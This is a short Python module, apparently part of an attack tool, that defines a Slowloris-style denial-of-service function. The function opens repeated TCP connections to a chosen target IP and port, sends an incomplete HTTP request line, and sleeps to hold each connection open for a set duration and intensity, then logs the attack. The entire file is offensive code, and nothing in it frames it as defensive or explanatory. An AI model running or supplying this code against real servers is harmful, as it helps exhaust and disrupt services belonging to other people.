import socket
import time
from app.logger import log_attack

def attack(target_ip, target_port, duration, intensity):
    start_time = time.time()
    while time.time() - start_time < duration:
        for _ in range(intensity):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            sock.send(b"GET / HTTP/1.1\r\n")
            time.sleep(10)  # Keep connection open

    log_attack("Slowloris", target_ip, target_port, duration, intensity)
    